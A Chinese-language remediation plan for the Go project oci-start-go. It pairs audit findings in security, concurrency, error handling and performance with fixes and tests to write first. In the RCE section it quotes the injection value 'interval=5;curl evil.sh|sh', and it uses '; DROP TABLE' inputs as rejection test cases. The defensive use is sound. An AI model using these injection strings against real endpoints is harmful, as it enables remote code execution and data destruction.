# oci-start-go 细节优化计划（详细版）

> 状态：已确认范围 = 全部 P0–P5（33 项高优先级）+ S4 根密码加密（含向后兼容迁移）。
> 约束：不动分层框架；不改公开 API 签名（导出函数/类型/方法）；向后兼容（数据格式变更需读时降级）；每项原子化；先写测试再改（TDD）；每完成一项跑 `go build ./... && go vet ./... && go test ./...`，并发项加 `-race`。
> 审计来源：18-agent workflow（11 子系统映射 + 7 维度审计），129 条发现（33 高 / 57 中 / 26 低，另有 ~13 中低补充）。本文件聚焦 33 项高优先级（实施范围），中/低见末尾 Backlog。
> 起点基线：git 工作区干净，`go build/vet/test ./...` 全绿（httpapi/oci/service/util-httpclient 通过，其余包无测试文件）。

---

## 0. 通用模式（多项共用，先说明）

### 0.1 WS per-conn 写入序列化（C1–C5、C7 共用）
gorilla/websocket 禁止并发写同一 conn，否则 panic/腐帧。统一方案：在 `internal/ws/ws.go` 引入一个 per-session 写封装：

```go
// safeConn 序列化对单个 websocket.Conn 的所有写操作。
type safeConn struct {
    c  *websocket.Conn
    mu sync.Mutex
}
func (w *safeConn) writeMessage(msgType int, data []byte) error {
    w.mu.Lock()
    defer w.mu.Unlock()
    _ = w.c.SetWriteDeadline(time.Now().Add(10 * time.Second)) // 防慢客户端阻塞
    return w.c.WriteMessage(msgType, data)
}
func (w *safeConn) writeJSON(v any) error {
    w.mu.Lock()
    defer w.mu.Unlock()
    _ = w.c.SetWriteDeadline(time.Now().Add(10 * time.Second))
    return w.c.WriteJSON(v)
}
```
各 handler 把 `conn *websocket.Conn` 替换为 `conn *safeConn`（或包一层），所有 `Write*` 走它。`Broadcast` 先 snapshot sessions 列表（锁内拷贝），放锁后再逐个 `writeMessage`，避免持锁跨阻塞写。
**测试**：`ws/safeconn_test.go`，`-race` 下并发 `writeMessage`+`writeJSON` 不 panic；`WriteDeadline` 到期返 err。

### 0.2 错误暴露模式（E1–E9 共用）
`_ = fn()` → 捕获并 `logger.Error().Err(err).Msg("...")`；面向客户端的路径额外 `response.Fail(c, 500, "..." )` 或在成功响应里带 `syncFailed` 标记。不新增导出签名。

### 0.3 TDD 流程（每项）
① 读目标文件确认现状 → ② 写一个会失败的测试（断言期望行为）→ ③ `go test` 看红 → ④ 最小改动转绿 → ⑤ `go build ./... && go vet ./... && go test ./...`（并发项 `-race`）→ ⑥ 必要时 refactor。

---

## 1. P0 安全（S1–S4 + 建议提升的 S5–S10）

### S1 [安全/RCE/高] `internal/httpapi/monitor_api.go:41` — 模板注入 RCE
- **现状**：`monitorDownload`（公开端点，无鉴权）把 `interval`、`token` 原样 `strings.ReplaceAll` 进内嵌 bash 脚本。脚本里 `INTERVAL={{INTERVAL}}` 无引号，`"token": "$TOKEN"` 在 JSON 串里。
- **问题**：`interval=5;curl evil.sh|sh` → `INTERVAL=5;curl evil.sh|sh`，下载并运行即 RCE；token 可 JSON/shell 突围。未授权端点，可托管恶意链接诱管理员运行。
- **方案**：
  ```go
  interval := c.DefaultQuery("interval", "10")
  n, err := strconv.Atoi(interval)
  if err != nil || n < 1 || n > 3600 {
      response.Fail(c, http.StatusBadRequest, "invalid interval"); return
  }
  token := c.Query("token")
  if !tokenRe.MatchString(token) { // 只允许 [A-Za-z0-9._-]{1,128}
      response.Fail(c, http.StatusBadRequest, "invalid token"); return
  }
  // 替换用 n 的字符串形式（纯数字）
  script = strings.ReplaceAll(script, "{{INTERVAL}}", strconv.Itoa(n))
  script = strings.ReplaceAll(script, "{{TOKEN}}", token)
  ```
- **测试（先红）**：`httpapi/monitor_api_test.go`
  - `TestMonitorDownload_RejectsMaliciousInterval`：`interval=5;curl evil` 断言 400 且响应体不含 `curl`。
  - `TestMonitorDownload_RejectsBadToken`：`token=a;b` 断言 400。
  - `TestMonitorDownload_OK`：合法 interval=15 断言 200 且含 `INTERVAL=15`。
- **兼容性**：合法 interval（1–3600 整数）与合法 token 不受影响；异常输入原应被拒。
- **验证**：`go test ./internal/httpapi/ -run TestMonitorDownload -race`

### S3 [安全/账号接管/高] `internal/httpapi/auth_password_reset.go:60` — reset code 回显
- **现状**：`sendResetCode` 生成 6 位 hex code，存 `system_config`，并把它放进 JSON 响应 `"code": code`（仅注释说"生产走邮件"）。叠加未授权 `/api/send-reset-code`。
- **问题**：知用户名即可拿 code → 调 `/api/reset-password` 接管账号。line 36 的"不暴露用户是否存在"被同一响应里的 code 击穿。
- **方案**：移除响应 `code` 字段，只回通用提示；code 走 notify/email 投递（若未配置邮件通道，记 warn 日志，不回显）。
- **测试（先红）**：`httpapi/auth_password_reset_test.go`
  - `TestSendResetCode_DoesNotLeakCode`：合法用户名调用，断言响应 JSON 不含 `code` 字段（`code` 不出现在 body）。
  - `TestSendResetCode_NonExistentUser_NoLeak`：不存在用户名也回相同通用提示（不区分）。
- **兼容性**：响应体删字段，前端只读 `message` 不受影响；行为变更是"不再回显 code"（这是修复目的）。
- **验证**：`go test ./internal/httpapi/ -run TestSendResetCode`

### S2 [安全/鉴权/高] `internal/httpapi/server.go:141-152` + `internal/ws/ws.go:18` — WS 无鉴权 + CSWSH
- **现状**：6 个 WS 端点（`/ws/ssh`、`/log/ws`、`/ws/monitor`、`/ws/console`、`/ws/vnc/:instanceId`、`/ws/rescue`）注册在根路由 `r`，绕过 `pro` 组的 `SessionAuth/UserContext/TenantContext`；`Upgrader.CheckOrigin` 恒返 true。
- **问题**：`/log/ws` 未授权流式泄露含 Turnstile bypass token 的日志；`/ws/rescue` 无凭据校验即做 OCI stop/detach/attach/start；CSWSH 可被恶意页面驱动。**实施时先核实各 handler 是否已有 token 校验**（审计判断为无，但需逐一确认 `ws/*.go` 的 `Handle*` 入口）。
- **方案**（保签名）：在 `server.go` 把 WS 路由改到 `pro` 组（`SessionAuth` 跑在升级握手前）；或在每个 `Handle*` 升级前调 `auth.TokenFromRequest(c) + deps.Session.Validate`，失败 401。token 走 query 参数（WS 标准）。`Upgrader.CheckOrigin` 改为按配置 allowlist 校验 Origin。前端 WS 连接 URL 带 `?token=`（前端同步改）。
- **测试（先红）**：`ws/auth_test.go`（httptest + gin）
  - `TestWS_RequiresToken`：无 token 升级 `/ws/console` 断言 401（不升级）。
  - `TestWS_BadToken_401`：无效 token 断言 401。
  - `TestWS_CheckOrigin_Rejected`：跨域 Origin 断言拒绝。
- **兼容性**：WS 端点 URL 未变；新增 token query 参数为行为变更（前端需同步），非签名变更。
- **验证**：`go test ./internal/ws/ ./internal/httpapi/ -race`

### S4 [安全/凭据泄露/高] `internal/httpapi/instance_detail.go:649` + `grabber/success.go:123` — root 密码明文存库+导出
- **现状**：实例 root 密码以明文 `sql.NullString` 存于 `instance_detail.password` 与 `tem_instance.root_password`（grabber/success.go:123 直接写）；`instanceExport`（instance_detail.go:649）写 `Root Pass:` 进可下载 .txt；migration 导出 dump 全行含密码列。租户 OCI key 已加密，但实例密码未加密。
- **问题**：SQLite 文件泄露/备份/导出即暴露所有受管实例 root 密码。
- **方案**（向后兼容迁移）：
  1. 写入前加密：grabber/success.go 与 service 写 `instance_detail`/`tem_instance` 处调 `crypto.EncryptString(password, masterKey)`。
  2. 读取时解密：service/instance_detail 各 row→response 转换处调 `crypto.DecryptString`；**读时降级**——解密失败则当明文（兼容旧数据），并后台迁移（解密成功的不动，明文的读出后择机加密回写）。
  3. 导出脱敏：`instanceExport` 默认不输出密码，或输出加密形式；migration 导出跳过/加密 password 列。
  4. 抽一个 `decryptPassword(raw, masterKey) string` helper 复用。
- **测试（先红）**：
  - `util/crypto/aesgcm_test.go`（见 B4，先做）保证加解密往返。
  - `grabber/success_test.go`：断言写入 DB 的 password 字段 ≠ 明文（是密文）。
  - `service/instance_detail_test.go`：插入明文旧 row → 读取返回明文（降级）；插入密文 row → 读取返回明文（解密）。
- **兼容性**：旧明文数据读时降级可用；不删列、不改 schema；导出行为变更（脱敏）是修复目的。⚠ 跨 grabber/repo/service/httpapi/migration 多文件，是本计划最大单项，放 P0 最后。
- **验证**：`go test ./internal/grabber/ ./internal/service/ ./internal/util/crypto/ -race`；手动跑一次导入旧库确认降级。

### 建议提升到 P0 的中等安全项（成本低、属安全，建议同批做）
- **S5** `internal/auth/cookie.go:17` — session cookie 无 `Secure` 标志，HTTP 明文传输。**方案**：`http.SecureCookie` 加 `Secure: true`（生产 HTTPS）；可按 `cfg.Deploy.Type`/TLS 决定。**测试**：`auth/cookie_test.go` 断言 cookie `Secure=true`。
- **S6** `internal/bootstrap/turnstile.go:45` — bypass token 明文日志 + 非常量时间比较。**方案**：日志脱敏（只打 hash/前缀）；比较用 `subtle.ConstantTimeCompare`。**测试**：`bootstrap/turnstile_test.go` 断言日志不含完整 token、常量时间比较。
- **S7** `internal/migration/importer.go:303` — 用不可信表名/列名拼 SQL → 注入。**方案**：表名/列名走白名单校验（`^[A-Za-z_][A-Za-z0-9_]*$`）或 `PRAGMA table_info` 比对，拒绝非法标识符。**测试**：`migration/importer_test.go`（见 B6）含 `; DROP TABLE` 用例断言被拒。
- **S8** `internal/service/ssh_config.go:33` — root 密码插进 shell 脚本 → 命令注入。**方案**：用 `ssh` 的 stdin/环境变量传密码，或 `sh -c` 单引号转义；禁用直接插值。**测试**：`service/ssh_config_test.go` 断言生成的命令不含未转义元字符。
- **S9** `internal/util/ip/ip.go:16` — `ClientIP` 无条件信 `X-Forwarded-For` → 伪造破 IpBan/审计。**方案**：仅当直连对端是可信代理（按配置 allowlist）时才采信 XFF；否则用 `RemoteAddr`。**测试**：`util/ip/ip_test.go` 断言非可信代理下 XFF 被忽略。
- **S10** `internal/ws/ssh.go:93` — SSH host key 校验关闭 → MITM。**方案**：`InsecureIgnoreHostKey` 换成 `known_hosts` 校验或可配置 fingerprint pinning。**测试**：`ws/ssh_test.go` 断言未配置可信 host 时连接失败。

> S5–S10 默认纳入本次（属安全、改动小）。若你想拆出去，告知即可。

---

## 2. P1 并发安全（C1–C7，共用 0.1 safeConn）

### C6 [并发+泄漏/高] `internal/ws/ws.go:42` — Hub.Shutdown 漏 Console/Rescue
- **现状**：`Hub.Shutdown` 只调 `h.SSH.Shutdown()` 和 `h.Log.Shutdown()`，不调 Console/Rescue。Console 持有活跃 SSH 隧道子进程 + PEM key 文件（console.go:292/504）；Rescue 持有 runRescueFlow goroutine 跑 OCI stop/detach/attach/start（context.Background()+30s sleep）。`ConsoleHandler.Shutdown()` 已存在（console.go:474）但未被调。
- **问题**：每次优雅重启：SSH 隧道子进程孤立继续跑、`data/console-keys/*.pem` 堆积、rescue flow 在关闭 DB 后仍调 OCI。
- **方案**：`Hub.Shutdown` 内加 `h.Console.Shutdown()`；新增 `h.Rescue.Shutdown()`（锁内遍历 `h.active`，关每个 flow 的 `Cancel`，可选 `Wait` 短超时）。
- **测试（先红）**：`ws/shutdown_test.go`：起一个带活跃 console session + rescue flow 的 hub，调 `Shutdown`，断言 `sshCmd.Process` 被 kill、PEM 文件被删、rescue flow 的 Cancel 被关（flow goroutine 退出）。
- **兼容性**：`Hub.Shutdown` 签名不变；新增未导出 `RescueHandler.Shutdown`。
- **验证**：`go test ./internal/ws/ -race`

### C1 [并发/高] `internal/ws/ssh.go:129` — stdout→WS goroutine 与主循环并发写
- **现状**：`handleConnect` 起 goroutine（129）每个 stdout 读都 `conn.WriteMessage`（134），主 `HandleSSH` 读循环也 `Write*`（61/97/103/110/127）同 conn；goroutine 仅在 stdout.Read 出错时退出，连接关闭不退出。
- **问题**：整会话期并发写竞态（panic/腐帧）；goroutine 泄漏。
- **方案**：conn 包 safeConn（0.1）；stdout goroutine 随 session close 退出（`select` on `ctx.Done()`/close(ch)）。所有 `Write*` 走 safeConn。
- **测试**：`ws/ssh_test.go`，`-race` 下模拟 stdout 不断 + 主循环写，不 panic；连接关闭后 stdout goroutine 退出（goroutine 计数）。
- **兼容性**：handler 签名不变。
- **验证**：`go test ./internal/ws/ -race`

### C2 [并发/高] `internal/ws/console.go:348` — 隧道等待 goroutine 无锁写 controlWS
- **现状**：SSH 进程等待 goroutine（337 起）调 `session.controlWS.WriteJSON`（349）无锁，主读循环也写 control conn（112/118/128/359）；goroutine 活到 `sshCmd.Wait` 返回，竞态跨整个会话。
- **方案**：control conn 走 safeConn；`vnc_ready`（359）写也守。
- **测试**：`ws/console_test.go`，`-race` 下并发 WriteJSON 不 panic。
- **兼容性**：不变。
- **验证**：`go test ./internal/ws/ -race`

### C3 [并发/高] `internal/ws/monitor.go:63,83` — Broadcast 持 RLock 跨阻塞写 + 乒乓并发写
- **现状**：`Broadcast`（83-93）持 `RLock` 对每个 session `conn.WriteMessage`（91）无 deadline；`HandleMonitor` 读循环（63）也从另一 goroutine 对同 conn 写 pong → 并发写。
- **问题**：死/慢客户端阻塞调度心跳 goroutine 并阻塞所有 dashboard 客户端；并发写 panic。
- **方案**：snapshot sessions 后放锁再 `writeMessage`；per-conn safeConn；`SetWriteDeadline`；写失败跳过/清理死 conn。
- **测试**：`ws/monitor_test.go`，`-race` 下 Broadcast + pong 并发不 panic；一个死 conn（写阻塞）不阻塞其他 conn 收到广播。
- **兼容性**：不变。
- **验证**：`go test ./internal/ws/ -race`

### C4 [并发/高] `internal/ws/rescue.go:227` — runRescueFlow 无锁读 h.deps + send() 竞态
- **现状**：`runRescueFlow`（go 启动于 160）在 227 读 `deps := h.deps` 无锁，`SetDeps`（81）/`handleInit`（137）在 `h.mu` 下写 → 指针数据竞态；flow goroutine 经 `send()`（372）写 conn，与 `handleStatus`（178）/`handleCancel`（200）主循环写同 conn 并发。
- **方案**：启动 goroutine 时按值传入 deps（或在 `h.mu` 内读）；conn 写走 safeConn。
- **测试**：`ws/rescue_test.go`，`-race` 下 `SetDeps` 与运行中 flow 并发不告警；并发 send+handleStatus 不 panic。
- **兼容性**：不变。
- **验证**：`go test ./internal/ws/ -race`

### C5 [并发/高] `internal/ws/rescue.go:155` — handleInit 覆盖旧 flow 不关 Cancel
- **现状**：`handleInit` 直接把新 flow 存进 `h.active[d.InstanceID]`，不检查/关闭旧 flow → 旧 `runRescueFlow` goroutine 不停（Cancel 不关）继续调 OCI 并写可能已死 conn，每次重发泄漏一个 goroutine。
- **方案**：`handleInit` 锁内若已有旧 flow，先关其 `Cancel`、删除，再存新（仿 console.go:323-332 杀旧 session）。
- **测试**：`ws/rescue_test.go`：同一 instance 连续两次 init，断言旧 flow 的 Cancel 被关、旧 goroutine 退出（计数）。
- **兼容性**：不变。
- **验证**：`go test ./internal/ws/ -race`

### C7 [性能+并发/高] `internal/ws/log.go:148` — broadcast 持锁跨 N 阻塞写（队头阻塞）
- **现状**：`broadcast` 持 `h.mu.Lock`（149）遍历 sessions 调 `conn.WriteMessage`（152）无 deadline。
- **问题**：一个慢/死客户端阻塞 tail goroutine 并阻塞所有客户端投递（锁也阻塞 add/remove session）。
- **方案**：per-session buffered channel + 专属 writer goroutine，`broadcast` 锁内只做非阻塞 `select{ case ch<-msg: default: }` 发送；或 snapshot+放锁+safeConn+deadline。
- **测试**：`ws/log_test.go`，`-race` 下：一个死 conn 不阻塞其他 conn 收广播；并发 add/remove session 与 broadcast 不 panic。
- **兼容性**：不变。
- **验证**：`go test ./internal/ws/ -race`

> P1 实施顺序：先 0.1 safeConn + C6（Hub.Shutdown 补齐，给后续提供清理基础）→ C1→C2→C3→C4→C5→C7。

---

## 3. P2 错误处理（E1–E9，共用 0.2）

### E3 [错误/高] `internal/scheduler/scheduler.go:87` — 11 处 cron.AddFunc 错误全丢
- **现状**：每处 `_, _ = s.cron.AddFunc(...)` 丢 `(EntryID, error)`。坏 cron 表达式致任务静默不跑（证书续期/流量/巡检/清理）。
- **方案**：`if _, err := s.cron.AddFunc(...); err != nil { s.logger.Error().Err(err).Msg("register job <name>") }`（或启动期 Fatal）。覆盖全部 11 处。
- **测试（先红）**：`scheduler/scheduler_test.go`：注入一个坏 cron 表达式，断言被记录（错误可见），而非静默。
- **兼容性**：不变。
- **验证**：`go test ./internal/scheduler/`

### E4 [错误/高] `internal/sysconf/sysconf.go:36` — GetString/GetBool 吞 DB 错误
- **现状**：`GetString`（38-40）/`GetBool`（47-49）对 `FindConfigByKey` 的任何错误返 ""/false，DB 抖动时 turnstile 看似关闭、mfa 看似关（安全相关）。
- **方案**（保签名）：返零值前 `logger.Warn().Err(err).Str("key", key).Msg("sysconf read failed")`；给 `Service` 加包级/实例 logger 字段。
- **测试（先红）**：`sysconf/sysconf_test.go`（见 B3）：让 DB 查询失败（断开/坏 SQL），断言 logger 收到 warn（用 `zerolog.New(&buf)` 捕获）。
- **兼容性**：签名不变。
- **验证**：`go test ./internal/sysconf/`

### E8 [错误/高] `internal/migration/import.go:88,95` + `internal/httpapi/auth_password_reset.go:42` — crypto/rand.Read 错误被吞
- **现状**：`rand.Read(key)`/`rand.Read(iv)` 忽略 `(n,err)`；CSPRNG 失败则零 key/IV。`auth_password_reset.go:42` 同样。
- **方案**：检查错误返；`GenerateIV` 改返 `([]byte, error)`（未导出，非公开 API 破坏）；reset code 生成失败 500。
- **测试（先红）**：`migration/import_test.go`（见 B2）：monkeypatch rand 失败（或用 `io.Reader` 注入）断言返错而非零 key。若 rand 不可注入，至少测正常路径往返 + 文档 CSPRNG 检查。
- **兼容性**：`GenerateIV` 未导出，签名变可接受；公开 API 不变。
- **验证**：`go test ./internal/migration/ ./internal/httpapi/`

### E9 [错误/高] `internal/httpapi/auth_password_reset.go:51` — sendResetCode 吞 UpsertConfigValue
- **现状**：`_ = q.UpsertConfigValue` 丢持久化错误；code 未存仍回成功 + 回显 code（S3）。
- **方案**：检查错误，失败 500"failed to store reset code"。
- **测试（先红）**：`httpapi/auth_password_reset_test.go`：让 Upsert 失败（坏 DB），断言 500。
- **兼容性**：不变。
- **验证**：`go test ./internal/httpapi/ -run TestSendResetCode`

### E6 [错误/高] `internal/httpapi/proxy.go:84` — proxySave 吞 ParseInt + Update 错误返 200
- **现状**：`id, _ := strconv.ParseInt` 忽略错误（非数字 id→0）；`_ = UpdateVpnProxyRecord` 忽略更新错误；无条件回 200。ID=0 可能改错行。
- **方案**：ParseInt 失败 400（仿 proxy.go:110 的 proxyDelete）；Update 失败 500。
- **测试（先红）**：`httpapi/proxy_test.go`：非数字 id 断言 400；Update 失败断言 500。
- **兼容性**：不变。
- **验证**：`go test ./internal/httpapi/ -run TestProxySave`

### E5 [错误/高] `internal/httpapi/dns.go:83` — sslIssue 吞 5 个 SetString 错误
- **现状**：ACME 签发成功后 5 个 `SetString`（证书/密钥/NotAfter 等）全 `_ =`；持久化失败则重启后 HTTPS 失效，但回"签发成功"。
- **方案**：检查每个 SetString，任一失败 log + 返 500"cert issued but persistence failed"。
- **测试（先红）**：`httpapi/dns_test.go`：mock certManager 成功 + SetString 失败，断言 500。
- **兼容性**：不变。
- **验证**：`go test ./internal/httpapi/ -run TestSslIssue`

### E1 [错误/高] `internal/service/email_send.go:103` — Send 吞所有 DB 写错误返 nil
- **现状**：`InsertEmailSendRecord`（103）、`UpdateEmailSendRecordState`（152）、`UpdateEmailBodyTotals`（159）、`IncrementSentCount`（166）、`FindEmailBodyById`（169 `body, _ :=`）全丢错；返回 nil。
- **问题**：send-record 状态 0、计数/totals 失真、返回零值 row，调用方无法区分全成功与全失败。
- **方案**：捕获错误，`logger.Error` + 返非 nil（或至少把 totals/count 失败返错）；per-recipient 循环累积失败并 log+surface。
- **测试（先红）**：`service/email_send_test.go`：让 DB 写失败，断言 Send 返错（或至少 logger 记录），而非 nil。
- **兼容性**：不变。
- **验证**：`go test ./internal/service/ -run TestEmailSend`

### E2 [错误/高] `internal/httpapi/instance_detail.go:375,434,496` — OCI 成功后本地 DB 更新被丢
- **现状**：Terminate 后 `DeleteInstanceDetail`（375）、ReassignPublicIP 后 `UpdateInstanceDetailPublicIp`（434）、AssignIpv6 后 `UpdateInstanceDetailIpv6`（496）全 `_ =`。云已变，库不变。
- **方案**：检查错误，失败 `deps.Logger.Error` + 返"cloud op succeeded but local sync failed"提示（或带 syncFailed 标记）。
- **测试（先红）**：`httpapi/instance_detail_test.go`：mock OCI 成功 + DB 更新失败，断言响应含同步失败提示。
- **兼容性**：不变。
- **验证**：`go test ./internal/httpapi/ -run TestInstanceTerminate`

### E7 [错误/高] `internal/ws/rescue.go:377` — CompleteRescue 吞 Stop/Detach/Attach/Start 错误 + tenantID=0
- **现状**：`StopInstance`（377）、`DetachBootVolume`（393）、`AttachBootVolume`（400）、`StartInstance`（406）全 `_ =`；且全传 `tenantID=0`（功能 bug）。
- **问题**：Stop 失败则对 RUNNING 实例 Detach/Attach 可毁启动配置；Attach 失败则无 boot 卷启动；客户端被报 progress=99/100 无失败。tenantID=0 致调用错租户。
- **方案**：检查每步，失败发 `RescueStatus.Error` 并中止（`send()` 已支持 Error 字段）；修正 tenantID 传参（从 flow 上下文取）。
- **测试（先红）**：`ws/rescue_test.go`：Stop 失败断言发 Error 并中止，不继续 Detach；tenantID 断言非 0。
- **兼容性**：不变。
- **验证**：`go test ./internal/ws/ -race`

> P2 顺序：E3→E4→E8→E9→E6→E5→E1→E2→E7（先小后大，rescue 放最后与 C4/C5 同文件可合并 review）。

---

## 4. P3 性能（P-1–P-3）

### P-1 [性能/高] `internal/service/tenant.go:60` — TenantService.List N+1
- **现状**：`List` 遍历 `ListTenants` 每行调 `FindRegisterDetailByTenantId`（64）、`CountBootInstancesByTenantId`（69）、`CountTenantChildren`（73），且每行 `repo.New` 三次。1+3N 往返 + 3N 分配。
- **方案**：循环外 hoist 一个 `q := repo.New(s.store.Read)`；新增 sqlc 查询把 3 个 count/lookup 折成一条 `LEFT JOIN tenant + register_detail + COUNT(boot_instance) + COUNT(children)` 聚合，单次往返。
- **测试（先红）**：`service/tenant_test.go`（内存 sqlite）：插 N 租户 + 各自子记录，调 `List`，断言底层只 1 次聚合查询（用计数 wrapper `*sql.DB` 或断言结果正确 + N 不放大调用）。
- **兼容性**：新增 repo 查询方法（导出，但新增不破坏旧）；`List` 返回结构不变。
- **验证**：`go test ./internal/service/ -run TestTenantList`

### P-2 [性能/高] `internal/service/instance_detail.go:54` — tenantNameMap 全表扫每次查询
- **现状**：`tenantNameMap`（54-64）跑 `ListTenants`（全表扫，含 masked 列）建 id→name map，被 `GetByID`（72）、`List`（91）、`ListByTenant`（105）调用。单实例查询也扫全表；`ListByTenant` 只需一个租户名却扫全部。无缓存。
- **方案**：在 `InstanceDetailSvc` 缓存 id→name（租户 save/delete 时刷新，用 `sync.RWMutex` 或 `atomic.Pointer[map]`）；或 `ListByTenant/GetByID` 改用单次 `FindTenantByID`。优先缓存方案（改动小、收益全）。
- **测试（先红）**：`service/instance_detail_test.go`：插 100 租户 + 1 实例，`GetByID` 断言只查 1 个租户（非全表）；租户改名后缓存刷新见新名。
- **兼容性**：不变。
- **验证**：`go test ./internal/service/ -run TestInstanceDetail -race`

### P-3 [性能/高] `internal/oci/network.go:16` — GetPrimaryVnic 冗余二遍 GetVnic
- **现状**：`ListInstancesByTenant`（instance_sync.go:56）每非终止实例调 `buildInstanceDetailRow` → `GetPrimaryVnic`（network.go:16）。后者列 VNIC 附件后每附件一次 `c.Vcn.GetVnic` 找 primary（25-36）；未命中再跑第二遍（38-46）重复调 GetVnic。O(instances×vnics) 串行 OCI 调用，且 2x 冗余。
- **方案**：单遍扫描时记住已取的 Vnic（map[attachmentID]*Vnic），fallback 复用而非重调；可选按实例有界并发（`errgroup` + 信号量）。
- **测试（先红）**：`oci/network_test.go`：mock Vcn client 返回 N 附件，断言 `GetVnic` 调用次数 ≤ N（非 2N）；primary 命中正确。
- **兼容性**：不变。
- **验证**：`go test ./internal/oci/ -run TestGetPrimaryVnic`

---

## 5. P4 真 bug + 补测试（B1–B6，每项先写失败测试）

### B1 [bug/高] `internal/notify/channels.go:355` — Feishu sign 用错 HMAC key（✅已核）
- **现状**：`h := hmac.New(sha256.New, []byte(str))`（str=待签串）当 key；正确应 `f.Secret`（对比 DingTalk channels.go:159 用 `d.Secret`）。签名恒被 Feishu 拒。
- **方案**：`h := hmac.New(sha256.New, []byte(f.Secret)); h.Write([]byte(str))`。
- **测试（先红）**：`notify/channels_test.go`（httptest）：独立算 `hmacSha256(secret, ts+"\n"+secret)`，断言请求里的签名 == 期望。先红（当前用错 key，签名不符）。
- **兼容性**：不变。
- **验证**：`go test ./internal/notify/`

### B2 [bug/高] `internal/migration/import.go:180` — ParseEncryptedFile 传空 key（✅已核）
- **现状**：`c.DecryptAndDecompress(dataBase64, "", iv)` 传空 key，无 key 公开 API 恒失败 len(key)!=32。
- **方案**：改为早返 `errors.New("masterKey required; use ParseEncryptedFileWithKey")`（不删函数，保调用点兼容）。
- **测试（先红）**：`migration/import_test.go`：`ParseEncryptedFile("")` 断言返清晰错误（非 base64/len 误导）；`ParseEncryptedFileWithKey` 往返成功。
- **兼容性**：返错信息变（原也是错），不破坏调用点（无调用点）。
- **验证**：`go test ./internal/migration/`

### B3 [bug/高] `internal/sysconf/sysconf.go:54` — 有损 upsert
- **现状**：`SetString` upsert 带 `ConfigEnabled: NullInt64{}`（清 enabled）；`SetEnabled` upsert 带 `ConfigValue: ""`（清 value）。先后调谁就清谁的另一列。
- **方案**：upsert 用 `COALESCE` 保留另一列，或读-改-写。
- **测试（先红）**：`sysconf/sysconf_test.go`（内存 sqlite）：先 `SetEnabled(k,true)` 再 `SetString(k,"v")`，断言 enabled 仍为 true（当前被清空→红）；反之亦然。
- **兼容性**：不变。
- **验证**：`go test ./internal/sysconf/`

### B4 [测试/高] `internal/util/crypto/aesgcm.go` — 信任根零测试
- **现状**：`Encrypt/Decrypt/EncryptString/DecryptString` 是保护所有租户 key/密码/邮件凭据的 AES-256-GCM 信封，零测试。
- **方案**：补 `aesgcm_test.go` 表驱动往返。
- **测试（先红→即此项目就是写测试）**：`util/crypto/aesgcm_test.go`：
  - 往返：empty/ascii/PEM/unicode，`DecryptString(EncryptString(s,key),key)==s`。
  - 篡改密文断言失败；短 blob `[]byte{1,2}` 断言失败；错 key 断言失败。
- **兼容性**：纯加测试。
- **验证**：`go test ./internal/util/crypto/`

### B5 [测试/高] `internal/auth/session.go:31` + middleware — session 零测试 + TZ 耦合
- **现状**：`SessionService`（30d 绝对/2h 活跃/单会话）+ `SessionAuth/IpBan/TenantContext` 全无测试；`time.ParseInLocation(timeFmt, sess.ExpiresAt, time.Local)`（65/69）依赖服务器 TZ。
- **方案**：补 session + middleware 测试。
- **测试**：`auth/session_test.go` + `auth/middleware_test.go`（内存 sqlite + httptest）：
  - `Create` 插一行 + 删旧会话；`Validate` 对过期绝对/过期活跃/未知 token 返 false；2h 活跃窗口 + touch 节流；TZ 用例（`time.LoadLocation`）暴露 ParseInLocation 耦合。
  - `SessionAuth` 无 token 401；有效 token 注入 username；`IpBan` 命中 403；`TenantContext` 读 X-Tenant-Id。
- **兼容性**：纯加测试（若 TZ 用例暴露 bug，单独修）。
- **验证**：`go test ./internal/auth/ -race`

### B6 [测试/高] `internal/migration/importer.go:415` — SQL 解析器零测试 + PEM 边界
- **现状**：`splitValues` 只跟踪单引号 toggle，PEM 体内 `''` 后接真逗号会错分；`parseInsertSQL` 用 `strings.LastIndex` 找 values 括号，嵌套括号字符串会断；`validateColumns`（323）用 `PRAGMA table_info(?)` 占位符不生效。零测试。
- **方案**：补表驱动测试 + 内存 sqlite 集成。
- **测试**：`migration/importer_test.go`：
  - `splitValues`/`parseInsertSQL` 表用例：简单行、NULL+数字+引号、多行 PEM 含逗号+转义 `''`、列/值数不匹配。
  - `ImportSQLText` 集成：TENANT 去重、LOGIN_USER skip、OCI_SSH_CONN 默认、INSERT OR IGNORE。
  - `validateColumns` 行为（暴露 PRAGMA 占位符问题）。
- **兼容性**：纯加测试（暴露的 bug 单独修，或在此修未导出函数）。
- **验证**：`go test ./internal/migration/`

---

## 6. P5 代码质量（Q1–Q5）

### Q4 [质量/低-中] `scripts/build.sh:67` + `scripts/setup.sh:15`
- **现状**：build.sh `CGO_ENABLED=1`（Dockerfile 用 0，modernc 纯 Go）；setup.sh `GO_MIN="1.22"`（go.mod 要求 1.25.0）。
- **方案**：build.sh 改 `CGO_ENABLED=0`；setup.sh `GO_MIN="1.25"`。
- **测试**：脚本无单测；手动 `./scripts/build.sh` 产静态二进制 + `file oci-start` 确认 statically linked。
- **兼容性**：构建更纯（静态）。
- **验证**：`./scripts/build.sh && file oci-start`

### Q2 [质量/低] `cmd/oci-start/main.go:523` — zerolog import hack
- **现状**：`var _ = zerolog.Logger{}` 保未用 import。
- **方案**：删 hack + 删 `zerolog` import（若 main.go 不直接用 zerolog 标识符）。
- **测试**：`go build ./cmd/oci-start` 通过即足够（编译检查）。
- **兼容性**：不变。
- **验证**：`go build ./...`

### Q5 [质量/低] `internal/config/config.go:140,167`
- **现状**：line 140 硬编码中文 `fmt.Println`（绕过 logger）；line 167 `strings.Replace(url, "./data", dp, 1)` 脆弱（未命中静默 no-op）。
- **方案**：改 logger 输出（配置加载后用 zerolog，加载前用 stderr 标注）；`applyDataPath` 改成显式前缀替换并处理未命中（log warn）。
- **测试**：`config/config_test.go`：`applyDataPath` 对绝对路径/已替换值断言行为明确（非静默 no-op）。
- **兼容性**：不变。
- **验证**：`go test ./internal/config/`

### Q1 [质量/高] `internal/httpapi/instance_detail.go:219` — 重复 oci-clients 样板
- **现状**：instanceModify/Start/Stop/Terminate/ChangeIP/EnableIPv6 各重复 `GetByID→FindTenantByID→tenantToCreds→NewProvider→NewClients`（~10 处，~120 行 copy-paste；shape_image.go 同样）。
- **方案**：抽 `func ociClientsForInstance(c *gin.Context, deps *Deps, id int64) (oci.Clients, *repo.InstanceDetailResp, error)`（或 Deps 方法），各 handler 调用。
- **测试**：`httpapi/instance_detail_test.go`：handler 行为不变（现有路径走通）；refactor 后全绿。
- **兼容性**：新增未导出 helper，不改导出 API。
